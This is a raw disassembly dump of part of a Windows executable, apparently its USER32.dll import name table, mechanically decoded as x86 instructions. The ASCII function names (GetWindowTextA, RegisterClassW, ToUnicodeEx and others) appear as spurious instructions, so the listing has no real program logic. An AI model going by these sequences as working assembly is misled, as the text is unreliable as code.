  4133a4:	add    BYTE PTR [eax],al
  4133a6:	mov    al,BYTE PTR [edx]
  4133a8:	push   esp
  4133a9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  4133b1:	ja     0x413426
  4133b3:	add    BYTE PTR [eax],ch
  4133b5:	add    BYTE PTR [ebx+0x68],al
  4133b8:	popa   
  4133b9:	jb     0x413407
  4133bb:	outs   dx,DWORD PTR ds:[esi]
  4133bc:	ja     0x413423
  4133be:	jb     0x413402
  4133c0:	jne    0x413428
  4133c2:	push   di
  4133c4:	add    BYTE PTR [eax],al
  4133c6:	bound  eax,QWORD PTR [eax]
  4133c8:	inc    ebx
  4133c9:	jb     0x413430
  4133cb:	popa   
  4133cc:	je     0x413433
  4133ce:	push   edi
  4133cf:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  4133d6:	inc    ecx
  4133d7:	add    BYTE PTR [ebx+0x2],dh
  4133da:	push   ebx
  4133db:	gs je  0x413435
  4133de:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4133e5:	js     0x41345b
  4133e7:	inc    ecx
  4133e8:	add    BYTE PTR [eax],al
  4133ea:	pop    ecx
  4133eb:	add    dl,BYTE PTR [ebx+0x65]
  4133ee:	je     0x413442
  4133f0:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4133f5:	jo     0x41346b
  4133f7:	jns    0x4133f9
  4133f9:	add    bh,ah
  4133fb:	add    BYTE PTR [esi+0x72],al
  4133fe:	popa   
  4133ff:	ins    DWORD PTR es:[edi],dx
  413400:	gs push edx
  413402:	arpl   WORD PTR gs:[eax+eax*1+0x3b],si
  413407:	add    DWORD PTR [edi+0x65],eax
  41340a:	je     0x413459
  41340c:	gs jae 0x413482
  41340f:	popa   
  413410:	addr16 gs inc ebp
  413413:	js     0x413489
  413415:	jb     0x413478
  413417:	dec    ecx
  413418:	outs   dx,BYTE PTR ds:[esi]
  413419:	outs   dx,WORD PTR ds:[esi]
  41341b:	add    BYTE PTR [eax+0x2],ch
  41341e:	push   ebx
  41341f:	gs je  0x413477
  413422:	jae    0x413489
  413424:	jb     0x413475
  413426:	bound  ebp,QWORD PTR [edx+0x65]
  413429:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  41342d:	outs   dx,WORD PTR ds:[esi]
  41342f:	jb     0x41349e
  413431:	popa   
  413432:	je     0x41349d
  413434:	outs   dx,DWORD PTR ds:[esi]
  413435:	outs   dx,BYTE PTR ds:[esi]
  413436:	push   edi
  413437:	add    BYTE PTR [ebx+0x73654400],dl
  41343d:	je     0x4134b1
  41343f:	outs   dx,DWORD PTR ds:[esi]
  413440:	jns    0x413483
  413442:	arpl   WORD PTR [ebx+0x65],sp
  413445:	ins    BYTE PTR es:[edi],dx
  413446:	gs jb  0x4134aa
  413449:	je     0x4134ba
  41344b:	jb     0x4134a1
  41344d:	popa   
  41344e:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413452:	xor    al,BYTE PTR [ecx]
  413454:	inc    edi
  413455:	gs je  0x4134a5
  413458:	outs   dx,BYTE PTR gs:[esi]
  41345a:	jne    0x4134a5
  41345c:	je     0x4134c3
  41345e:	ins    DWORD PTR es:[edi],dx
  41345f:	inc    ebx
  413460:	outs   dx,DWORD PTR ds:[esi]
  413461:	jne    0x4134d1
  413463:	je     0x413465
  413465:	add    BYTE PTR [ebp+0x79656b02],bh
  41346b:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  41346f:	jbe    0x4134d6
  413471:	outs   dx,BYTE PTR ds:[esi]
  413472:	je     0x413474
  413474:	call   0x65b1837a
  413479:	outs   dx,BYTE PTR ds:[esi]
  41347a:	dec    ecx
  41347b:	arpl   WORD PTR [edi+0x6e],bp
  41347e:	add    BYTE PTR [eax],al
  413480:	das    
  413481:	add    dl,BYTE PTR [ebx+0x65]
  413484:	je     0x4134c7
  413486:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  41348a:	gs push edi
  41348c:	imul   ebp,DWORD PTR [esi+0x64],0x5f00776f
  413493:	add    dl,BYTE PTR [ebx+0x65]
  413496:	je     0x4134eb
  413498:	jns    0x41350d
  41349a:	inc    ebx
  41349b:	outs   dx,DWORD PTR ds:[esi]
  41349c:	ins    BYTE PTR es:[edi],dx
  41349d:	outs   dx,DWORD PTR ds:[esi]
  41349e:	jb     0x413513
  4134a0:	add    BYTE PTR [eax],al
  4134a2:	mov    dh,0x1
  4134a4:	dec    esp
  4134a5:	outs   dx,DWORD PTR ds:[esi]
  4134a6:	popa   
  4134a7:	fs dec ebp
  4134a9:	outs   dx,BYTE PTR gs:[esi]
  4134ab:	jne    0x4134ee
  4134ad:	add    BYTE PTR ds:0x61684300,ch
  4134b3:	jb     0x413503
  4134b5:	gs js  0x41352c
  4134b8:	push   edi
  4134b9:	add    dh,cl
  4134bb:	add    DWORD PTR [ebp+0x65],ecx
  4134be:	jae    0x413533
  4134c0:	popa   
  4134c1:	addr16 gs inc edx
  4134c4:	outs   dx,DWORD PTR ds:[esi]
  4134c5:	js     0x413508
  4134c7:	add    BYTE PTR [edx+eax*1+0x6e617254],dl
  4134ce:	jae    0x41353c
  4134d0:	popa   
  4134d1:	je     0x413538
  4134d3:	inc    ecx
  4134d4:	arpl   WORD PTR [ebx+0x65],sp
  4134d7:	ins    BYTE PTR es:[edi],dx
  4134d8:	gs jb  0x41353c
  4134db:	je     0x41354c
  4134dd:	jb     0x413536
  4134df:	add    BYTE PTR [ecx+0x66654400],cl
  4134e5:	inc    esi
  4134e6:	jb     0x413549
  4134e8:	ins    DWORD PTR es:[edi],dx
  4134e9:	gs push eax
  4134eb:	jb     0x41355c
  4134ed:	arpl   WORD PTR [ecx+0x0],ax
  4134f0:	test   DWORD PTR [edx],eax
  4134f2:	push   ebx
  4134f3:	jns    0x413568
  4134f5:	je     0x41355c
  4134f7:	ins    DWORD PTR es:[edi],dx
  4134f8:	push   eax
  4134f9:	popa   
  4134fa:	jb     0x41355d
  4134fc:	ins    DWORD PTR es:[edi],dx
  4134fd:	gs je  0x413565
  413500:	jb     0x413575
  413502:	dec    ecx
  413503:	outs   dx,BYTE PTR ds:[esi]
  413504:	outs   dx,WORD PTR ds:[esi]
  413506:	inc    ecx
  413507:	add    BYTE PTR ds:0x67655202,al
  41350d:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  413514:	popa   
  413515:	jae    0x41358a
  413517:	push   edi
  413518:	add    BYTE PTR [eax],al
  41351a:	iret   
  41351b:	add    DWORD PTR [ebp+0x65],ecx
  41351e:	jae    0x413593
  413520:	popa   
  413521:	addr16 gs inc edx
  413524:	outs   dx,DWORD PTR ds:[esi]
  413525:	js     0x41356c
  413527:	js     0x41356a
  413529:	add    BYTE PTR [ecx],ch
  41352b:	add    BYTE PTR [ebx+0x68],al
  41352e:	popa   
  41352f:	jb     0x41357d
  413531:	outs   dx,DWORD PTR ds:[esi]
  413532:	ja     0x413599
  413534:	jb     0x41358d
  413536:	add    BYTE PTR [eax],al
  413538:	pushf  
  413539:	add    BYTE PTR [ecx+ebp*2+0x61],al
  41353d:	ins    BYTE PTR es:[edi],dx
  41353e:	outs   dx,DWORD PTR ds:[esi]
  41353f:	addr16 inc edx
  413541:	outs   dx,DWORD PTR ds:[esi]
  413542:	js     0x413594
  413544:	popa   
  413545:	jb     0x4135a8
  413547:	ins    DWORD PTR es:[edi],dx
  413548:	inc    ecx
  413549:	add    BYTE PTR [esi],bh
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x41359d
  413550:	gs jae 0x4135c6
  413553:	popa   
  413554:	addr16 gs push edi
  413557:	add    BYTE PTR [edi+0x2],dl
  41355a:	push   ebx
  41355b:	gs je  0x4135ae
  41355e:	jb     0x4135cf
  413560:	jo     0x4135b9
  413562:	add    BYTE PTR [eax],al
  413564:	loope  0x413566
  413566:	inc    esi
  413567:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  41356e:	outs   dx,DWORD PTR ds:[esi]
  41356f:	ja     0x4135b2
  413571:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  413578:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x6f43004a
  413580:	jo     0x4135fb
  413582:	inc    ecx
  413583:	arpl   WORD PTR [ebx+0x65],sp
  413586:	ins    BYTE PTR es:[edi],dx
  413587:	gs jb  0x4135eb
  41358a:	je     0x4135fb
  41358c:	jb     0x4135e2
  41358e:	popa   
  41358f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  413593:	add    cl,al
  413595:	add    BYTE PTR [ebp+0x6e],al
  413598:	popa   
  413599:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  41359d:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  4135a4:	pop    edx
  4135a5:	add    dl,BYTE PTR [ebx+0x65]
  4135a8:	je     0x4135fd
  4135aa:	arpl   WORD PTR [edx+0x6f],si
  4135ad:	ins    BYTE PTR es:[edi],dx
  4135ae:	ins    BYTE PTR es:[edi],dx
  4135af:	dec    ecx
  4135b0:	outs   dx,BYTE PTR ds:[esi]
  4135b1:	outs   dx,WORD PTR ds:[esi]
  4135b3:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4135ba:	push   ebx
  4135bb:	je     0x41362f
  4135bd:	imul   ebp,DWORD PTR [esi+0x67],0x350057
  4135c4:	inc    ebx
  4135c5:	push   0x6f547261
  4135ca:	dec    edi
  4135cb:	gs ins DWORD PTR es:[edi],dx
  4135cd:	push   edi
  4135ce:	add    BYTE PTR [eax],al
  4135d0:	inc    BYTE PTR [eax]
  4135d2:	inc    edi
  4135d3:	gs je  0x413619
  4135d6:	ins    BYTE PTR es:[edi],dx
  4135d7:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  4135de:	jb     0x4135e0
  4135e0:	dec    edx
  4135e1:	add    dl,BYTE PTR [ebx+0x65]
  4135e4:	je     0x413633
  4135e6:	outs   dx,BYTE PTR gs:[esi]
  4135e8:	jne    0x41362e
  4135ea:	gs popaw 
  4135ed:	jne    0x41365b
  4135ef:	je     0x41363a
  4135f1:	je     0x413658
  4135f3:	ins    DWORD PTR es:[edi],dx
  4135f4:	add    BYTE PTR [eax],al
  4135f6:	mov    DWORD PTR [ecx],eax
  4135f8:	dec    ecx
  4135f9:	outs   dx,BYTE PTR ds:[esi]
  4135fa:	jbe    0x41365d
  4135fc:	ins    BYTE PTR es:[edi],dx
  4135fd:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  413605:	je     0x413607
  413607:	add    BYTE PTR [ecx+0x616f4c01],ch
  41360d:	fs inc edx
  41360f:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x15004170
  413617:	add    DWORD PTR [edi+0x65],eax
  41361a:	je     0x413662
  41361c:	outs   dx,DWORD PTR ds:[esi]
  41361d:	jb     0x413684
  41361f:	addr16 jb 0x413691
  413622:	jne    0x413692
  413624:	fs push edi
  413626:	imul   ebp,DWORD PTR [esi+0x64],0xb800776f
  41362d:	add    BYTE PTR [edx+esi*2+0x61],al
  413631:	ja     0x413686
  413633:	je     0x413696
  413635:	je     0x41369c
  413637:	push   edi
  413638:	add    BYTE PTR [eax],al
  41363a:	xchg   ebx,eax
  41363b:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41363f:	outs   dx,BYTE PTR ds:[esi]
  413640:	jae    0x4136ae
  413642:	popa   
  413643:	je     0x4136aa
  413645:	inc    ecx
  413646:	arpl   WORD PTR [ebx+0x65],sp
  413649:	ins    BYTE PTR es:[edi],dx
  41364a:	gs jb  0x4136ae
  41364d:	je     0x4136be
  41364f:	jb     0x413692
  413651:	add    BYTE PTR [eax+0x57734901],ah
  413657:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41365e:	and    eax,0x6e655302
  413663:	fs dec ecx
  413665:	outs   dx,BYTE PTR ds:[esi]
  413666:	jo     0x4136dd
  413668:	je     0x41366a
  41366a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41366b:	add    DWORD PTR [ebx+0x69],ecx
  41366e:	ins    BYTE PTR es:[edi],dx
  41366f:	ins    BYTE PTR es:[edi],dx
  413670:	push   esp
  413671:	imul   ebp,DWORD PTR [ebp+0x65],0x1b10072
  413678:	dec    esp
  413679:	outs   dx,DWORD PTR ds:[esi]
  41367a:	popa   
  41367b:	fs dec ecx
  41367d:	ins    DWORD PTR es:[edi],dx
  41367e:	popa   
  41367f:	addr16 gs inc ecx
  413682:	add    BYTE PTR [eax],al
  413684:	daa    
  413685:	add    DWORD PTR [edi+0x65],eax
  413688:	je     0x4136d5
  41368a:	gs jns 0x4136ef
  41368d:	outs   dx,DWORD PTR ds:[esi]
  41368e:	popa   
  41368f:	jb     0x4136f5
  413691:	push   esp
  413692:	jns    0x413704
  413694:	add    BYTE PTR gs:[ebx+0x61724400],dh
  41369b:	ja     0x4136e6
  41369d:	arpl   WORD PTR [edi+0x6e],bp
  4136a0:	add    BYTE PTR [eax],al
  4136a2:	mov    BYTE PTR [edx],al
  4136a4:	push   esp
  4136a5:	popa   
  4136a6:	bound  esp,QWORD PTR [edx+0x65]
  4136a9:	fs push esp
  4136ab:	gs js  0x413722
  4136ae:	dec    edi
  4136af:	jne    0x413725
  4136b1:	push   edi
  4136b2:	add    BYTE PTR [eax],al
  4136b4:	push   0x74654701
  4136b9:	push   edi
  4136ba:	imul   ebp,DWORD PTR [esi+0x64],0x8200776f
  4136c1:	add    DWORD PTR [ecx+0x6e],ecx
  4136c4:	data16 ins BYTE PTR es:[edi],dx
  4136c6:	popa   
  4136c7:	je     0x41372e
  4136c9:	push   edx
  4136ca:	arpl   WORD PTR gs:[eax+eax*1-0x2b],si
  4136cf:	add    DWORD PTR [ebp+0x65],ecx
  4136d2:	jae    0x413747
  4136d4:	popa   
  4136d5:	addr16 gs inc edx
  4136d8:	outs   dx,DWORD PTR ds:[esi]
  4136d9:	js     0x413732
  4136db:	add    BYTE PTR [eax],bh
  4136dd:	add    dl,BYTE PTR [ebx+0x65]
  4136e0:	je     0x413725
  4136e2:	jne    0x413756
  4136e4:	jae    0x413755
  4136e6:	jb     0x4136e8
  4136e8:	mov    es,WORD PTR [edx]
  4136ea:	push   esp
  4136eb:	outs   dx,DWORD PTR ds:[esi]
  4136ec:	push   ebp
  4136ed:	outs   dx,BYTE PTR ds:[esi]
  4136ee:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  4136f5:	add    BYTE PTR [esi+0x52734901],bl
  4136fb:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  413700:	jo     0x413776
  413702:	jns    0x413704
  413704:	clc    
  413705:	add    BYTE PTR [edi+0x65],al
  413708:	je     0x41374d
  41370a:	ins    BYTE PTR es:[edi],dx
  41370b:	popa   
  41370c:	jae    0x413781
  41370e:	dec    esp
  41370f:	outs   dx,DWORD PTR ds:[esi]
  413710:	outs   dx,BYTE PTR ds:[esi]
  413711:	addr16 inc ecx
  413713:	add    BYTE PTR [ecx+0x57734901],ah
  413719:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  413720:	popa   
  413721:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  413725:	add    BYTE PTR [edx+eax*1+0x74697753],al
  41372c:	arpl   WORD PTR [eax+0x54],bp
  41372f:	outs   dx,DWORD PTR ds:[esi]
  413730:	push   esp
  413731:	push   0x69577369
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	outs   dx,DWORD PTR fs:[esi]
  413739:	ja     0x41373b
  41373b:	add    BYTE PTR [ebx],cl
  41373d:	add    DWORD PTR [edi+0x65],eax
  413740:	je     0x413786
  413742:	inc    ebx
  413743:	inc    ebp
  413744:	js     0x413746
  413746:	stos   DWORD PTR es:[edi],eax
  413747:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41374b:	fs inc ebx
  41374d:	jne    0x4137c1
  41374f:	jae    0x4137c0
  413751:	jb     0x413794
  413753:	add    BYTE PTR [edx+0x766e4901],cl
  413759:	popa   
  41375a:	ins    BYTE PTR es:[edi],dx
  41375b:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x6e675265
  413763:	add    BYTE PTR [edx+0x57734901],ah
  413769:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  413770:	imul   esp,DWORD PTR [ebx+0x6f],0xe4006564
  413777:	add    DWORD PTR [edi+0x66],ecx
  41377a:	data16 jae 0x4137e2
  41377d:	je     0x4137d1
  41377f:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413784:	cmp    eax,0x65684300
  413789:	arpl   WORD PTR [ebx+0x52],bp
  41378c:	popa   
  41378d:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  413795:	outs   dx,BYTE PTR ds:[esi]
  413796:	add    BYTE PTR [eax],al
  413798:	adc    eax,DWORD PTR [edx]
  41379a:	push   edx
  41379b:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69577265
  4137a4:	outs   dx,BYTE PTR ds:[esi]
  4137a5:	outs   dx,DWORD PTR fs:[esi]
  4137a7:	ja     0x4137f6
  4137a9:	gs jae 0x41381f
  4137ac:	popa   
  4137ad:	addr16 gs push edi
  4137b0:	add    BYTE PTR [eax],al
  4137b2:	or     al,BYTE PTR [edx]
  4137b4:	push   edx
  4137b5:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  4137be:	je     0x41380b
  4137c0:	gs jns 0x4137c3
  4137c3:	add    BYTE PTR [eax+0x746e4901],cl
  4137c9:	gs jb  0x41383f
  4137cc:	arpl   WORD PTR gs:[edx+edx*2+0x65],si
  4137d1:	arpl   WORD PTR [eax+eax*1-0x17],si
  4137d5:	add    DWORD PTR [edi+0x70],ecx
  4137d8:	outs   dx,BYTE PTR gs:[esi]
  4137da:	dec    ecx
  4137db:	outs   dx,BYTE PTR ds:[esi]
  4137dc:	jo     0x413853
  4137de:	je     0x413824
  4137e0:	gs jae 0x41384e
  4137e3:	je     0x413854
  4137e5:	jo     0x4137e7
  4137e7:	add    BYTE PTR [edx],al
  4137e9:	add    dl,BYTE PTR [edx+0x65]
  4137ec:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  4137f4:	popa   
  4137f5:	jae    0x41386a
  4137f7:	inc    ecx
  4137f8:	add    BYTE PTR [eax],al
  4137fa:	jno    0x4137fe
  4137fc:	push   ebx
  4137fd:	gs je  0x413857
  413800:	imul   ebp,DWORD PTR [esi+0x64],0x6752776f
  413807:	outs   dx,BYTE PTR ds:[esi]
  413808:	add    BYTE PTR [eax],al
  41380a:	mov    ecx,0x616f4c01
  41380f:	fs dec ebp
  413811:	outs   dx,BYTE PTR gs:[esi]
  413813:	jne    0x41386c
  413815:	add    BYTE PTR ds:0x74654701,ch
  41381b:	dec    ebp
  41381c:	outs   dx,BYTE PTR gs:[esi]
  41381e:	jne    0x413863
  413820:	push   0x4d6b6365
  413825:	popa   
  413826:	jb     0x413893
  413828:	inc    esp
  413829:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413830:	outs   dx,BYTE PTR ds:[esi]
  413831:	jae    0x413833
  413833:	add    BYTE PTR [esi+0x66654400],cl
  413839:	push   edi
  41383a:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413841:	outs   dx,DWORD PTR ds:[esi]
  413842:	arpl   WORD PTR [ecx+0x0],ax
  413845:	add    BYTE PTR [ebx],al
  413847:	add    BYTE PTR [ecx+0x64],al
  41384a:	push   0x75
  41384c:	jae    0x4138c2
  41384e:	push   edi
  41384f:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  413856:	arpl   WORD PTR [ebp+eax*2+0x78],si
  41385a:	add    BYTE PTR [eax],al
  41385c:	add    eax,0x6c6c4100
  413861:	outs   dx,DWORD PTR ds:[esi]
  413862:	ja     0x4138b7
  413864:	gs je  0x4138ad
  413867:	outs   dx,DWORD PTR ds:[esi]
  413868:	jb     0x4138cf
  41386a:	addr16 jb 0x4138dc
  41386d:	jne    0x4138dd
  41386f:	fs push edi
  413871:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413878:	ja     0x41387b
  41387a:	inc    edi
  41387b:	gs je  0x4138d5
  41387e:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  413885:	js     0x4138fb
  413887:	dec    esp
  413888:	outs   dx,BYTE PTR gs:[esi]
  41388a:	addr16 je 0x4138f5
  41388d:	push   edi
  41388e:	add    BYTE PTR [eax],al
  413890:	pushf  
  413891:	add    DWORD PTR [ecx+0x73],ecx
  413894:	dec    ecx
  413895:	arpl   WORD PTR [edi+0x6e],bp
  413898:	imul   esp,DWORD PTR [ebx+0x0],0x53024e00
  41389f:	gs je  0x4138ef
  4138a2:	outs   dx,BYTE PTR gs:[esi]
  4138a4:	jne    0x4138ef
  4138a6:	je     0x41390d
  4138a8:	ins    DWORD PTR es:[edi],dx
  4138a9:	dec    ecx
  4138aa:	outs   dx,BYTE PTR ds:[esi]
  4138ab:	outs   dx,WORD PTR ds:[esi]
  4138ad:	push   edi
  4138ae:	add    BYTE PTR [eax],al
  4138b0:	dec    eax
  4138b1:	add    dl,BYTE PTR [ebx+0x65]
  4138b4:	je     0x413903
  4138b6:	outs   dx,BYTE PTR gs:[esi]
  4138b8:	jne    0x4138ba
  4138ba:	inc    esp
  4138bb:	add    BYTE PTR [ebx+0x6c],al
  4138be:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  4138c5:	jb     0x4138c7
  4138c7:	add    cl,al
  4138c9:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  4138cd:	imul   esi,DWORD PTR [ebp+0x70],0x49
  4138d1:	arpl   WORD PTR [edi+0x6e],bp
  4138d4:	dec    ecx
  4138d5:	fs inc esi
  4138d7:	jb     0x413948
  4138d9:	ins    DWORD PTR es:[edi],dx
  4138da:	inc    esp
  4138db:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4138e2:	jns    0x4138e4
  4138e4:	add    BYTE PTR ss:[ebx+0x68],al
  4138e8:	popa   
  4138e9:	jb     0x413940
  4138eb:	jo     0x41395d
  4138ed:	gs jb  0x413931
  4138f0:	add    BYTE PTR [eax],al
  4138f2:	mov    edi,0x636f4c01
  4138f7:	imul   edx,DWORD PTR [edi+0x69],0x6e
  4138fb:	outs   dx,DWORD PTR fs:[esi]
  4138fd:	ja     0x413954
  4138ff:	jo     0x413965
  413901:	popa   
  413902:	je     0x413969
  413904:	add    BYTE PTR [eax],al
  413906:	cmp    BYTE PTR [ecx],al
  413908:	inc    edi
  413909:	gs je  0x413959
  41390c:	outs   dx,BYTE PTR gs:[esi]
  41390e:	jne    0x413963
  413910:	je     0x413984
  413912:	imul   ebp,DWORD PTR [esi+0x67],0xc9000041
  413919:	add    DWORD PTR [ebp+0x61],ecx
  41391c:	jo     0x413975
  41391e:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  413925:	imul   ebp,DWORD PTR [esi+0x74],0x1620073
  41392c:	inc    edi
  41392d:	gs je  0x413984
  413930:	outs   dx,DWORD PTR ds:[esi]
  413931:	jo     0x41398a
  413933:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41393a:	pop    ecx
  41393b:	add    BYTE PTR [ebx+0x72],al
  41393e:	gs popa 
  413940:	je     0x4139a7
  413942:	inc    esp
  413943:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  41394a:	jb     0x4139ad
  41394c:	ins    DWORD PTR es:[edi],dx
  41394d:	push   edi
  41394e:	add    BYTE PTR [eax],al
  413950:	inc    edx
  413951:	add    DWORD PTR [edi+0x65],eax
  413954:	je     0x4139a4
  413956:	gs js  0x4139cd
  413959:	inc    esp
  41395a:	ins    BYTE PTR es:[edi],dx
  41395b:	addr16 inc edi
  41395d:	jb     0x4139ce
  41395f:	jne    0x4139d1
  413961:	dec    ecx
  413962:	je     0x4139c9
  413964:	ins    DWORD PTR es:[edi],dx
  413965:	add    bl,bh
  413967:	add    DWORD PTR [eax+0x74],edx
  41396a:	dec    ecx
  41396b:	outs   dx,BYTE PTR ds:[esi]
  41396c:	push   edx
  41396d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413972:	push   ebp
  413973:	push   ebx
  413974:	inc    ebp
  413975:	push   edx
  413976:	xor    esi,DWORD PTR [edx]
  413978:	cs fs ins BYTE PTR es:[edi],dx
  41397b:	ins    BYTE PTR es:[edi],dx
  41397c:	add    BYTE PTR [eax],al
  41397e:	jns    0x4139c5
  413980:	pop    ecx
  413981:	je     0x4139cb
  413983:	push   ebp
  413984:	jp     0x4139f2
  413986:	jae    0x4139f8
  413988:	push   ecx
  413989:	dec    edx
  41398a:	push   0x47
  41398c:	jne    0x4139d4
  41398e:	fidivr WORD PTR ds:0x3de60041
  413994:	inc    ecx
  413995:	add    dh,dl
  413997:	cmp    eax,DWORD PTR [ecx+0x0]
  41399a:	out    dx,al
  41399b:	or     esi,DWORD PTR [edx+0x3a4f7d0e]
  4139a1:	dec    edi
  4139a2:	ja     0x4139f3
  4139a4:	cmp    DWORD PTR [edi+0x4f],ecx
  4139a7:	dec    edi
  4139a8:	cmp    al,0x4f
  4139aa:	jb     0x4139fb
  4139ac:	xor    ecx,DWORD PTR [edi+0x5e]
  4139af:	dec    edi
  4139b0:	ss dec edi
  4139b2:	jnp    0x413a03
  4139b4:	xor    eax,0x2a4f3a4f
  4139b9:	dec    edi
  4139ba:	push   ds
  4139bb:	push   edx
  4139bc:	pop    ds
  4139bd:	push   ebx
  4139be:	cmp    eax,0x3a4f7d4f
  4139c3:	dec    edi
  4139c4:	ja     0x413a15
  4139c6:	cmp    DWORD PTR [edi+0x4f],ecx
  4139c9:	dec    edi
  4139ca:	cmp    al,0x4f
  4139cc:	jb     0x413a1d
  4139ce:	xor    ecx,DWORD PTR [edi+0x5e]
  4139d1:	dec    edi
  4139d2:	ss dec edi
  4139d4:	ins    DWORD PTR es:[edi],dx
  4139d5:	dec    edi
  4139d6:	xor    eax,0x2a4f3a4f
  4139db:	dec    edi
  4139dc:	push   ds
  4139dd:	bound  ebx,QWORD PTR [edi]
  4139df:	arpl   WORD PTR ds:0x3a4f7d4f,di
  4139e5:	dec    edi
  4139e6:	push   0x4f
  4139e8:	cmp    DWORD PTR [edi+0x7b],ecx
  4139eb:	dec    edi
  4139ec:	cmp    eax,0x304f484f
  4139f1:	dec    edi
  4139f2:	cmp    cl,BYTE PTR [edi+0x34]
  4139f5:	dec    edi
  4139f6:	push   ds
  4139f7:	jb     0x413a18
  4139f9:	jae    0x413a0a
  4139fb:	or     DWORD PTR [eax+eax*4],0x7c
  4139ff:	nop
  413a00:	jge    0x413993
  413a02:	aas    
  413a03:	dec    edi
  413a04:	jbe    0x413a55
  413a06:	cmp    cl,BYTE PTR [edi+0x76]
  413a09:	dec    edi
  413a0a:	ds dec edi
  413a0c:	dec    eax
  413a0d:	dec    edi
  413a0e:	cmp    eax,0x314f7b4f
  413a13:	dec    edi
  413a14:	cmp    cl,BYTE PTR [edi+0x36]
  413a17:	dec    edi
  413a18:	push   ds
  413a19:	sbb    BYTE PTR [edi],0x83
  413a1c:	setae  BYTE PTR [eax+edx*4]
  413a20:	jl     0x4139c2
  413a22:	jge    0x4139c5
  413a24:	aas    
  413a25:	dec    edi
  413a26:	jbe    0x413a77
  413a28:	cmp    cl,BYTE PTR [edi+0x76]
  413a2b:	dec    edi
  413a2c:	ds dec edi
  413a2e:	dec    eax
  413a2f:	dec    edi
  413a30:	cmp    eax,0x314f6d4f
  413a35:	dec    edi
  413a36:	cmp    cl,BYTE PTR [edi+0x36]
  413a39:	dec    edi
  413a3a:	push   ds
  413a3b:	xchg   edx,eax
  413a3c:	pop    ds
  413a3d:	xchg   ebx,eax
  413a3e:	bt     DWORD PTR [eax+eiz*4],ecx
  413a42:	jl     0x4139f4
  413a44:	jge    0x4139f7
  413a46:	aas    
  413a47:	dec    edi
  413a48:	ins    BYTE PTR es:[edi],dx
  413a49:	dec    edi
  413a4a:	cmp    cl,BYTE PTR [edi+0x4e]
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x7b],ecx
  413a51:	dec    edi
  413a52:	cmp    eax,0x304f554f
  413a57:	dec    edi
  413a58:	cmp    cl,BYTE PTR [edi+0x36]
  413a5b:	dec    edi
  413a5c:	push   ds
  413a5d:	mov    ds:0xb30fa31f,al
  413a62:	or     al,0xb0
  413a64:	jl     0x413a26
  413a66:	jge    0x413a29
  413a68:	aas    
  413a69:	dec    edi
  413a6a:	ins    BYTE PTR es:[edi],dx
  413a6b:	dec    edi
  413a6c:	cmp    cl,BYTE PTR [edi+0x4e]
  413a6f:	dec    edi
  413a70:	cmp    DWORD PTR [edi+0x7c],ecx
  413a73:	dec    edi
  413a74:	cmp    eax,0x334f5f4f
  413a79:	dec    edi
  413a7a:	cmp    cl,BYTE PTR [edi+0x31]
  413a7d:	dec    edi
  413a7e:	push   ds
  413a7f:	mov    dl,0x1f
  413a81:	mov    bl,0xf
  413a83:	ret    
  413a84:	or     al,0xc0
  413a86:	jl     0x413a58
  413a88:	jge    0x413a5b
  413a8a:	aas    
  413a8b:	dec    edi
  413a8c:	ins    BYTE PTR es:[edi],dx
  413a8d:	dec    edi
  413a8e:	cmp    cl,BYTE PTR [edi+0x4e]
  413a91:	dec    edi
  413a92:	cmp    DWORD PTR [edi+0x6a],ecx
  413a95:	dec    edi
  413a96:	cmp    eax,0x304f4e4f
  413a9b:	dec    edi
  413a9c:	cmp    cl,BYTE PTR [edi+0x34]
  413a9f:	dec    edi
  413aa0:	push   ds
  413aa1:	ret    0xc31f
  413aa4:	psrlq  mm1,QWORD PTR [eax+edx*8]
  413aa8:	jl     0x413a8a
  413aaa:	jge    0x413a8d
  413aac:	aas    
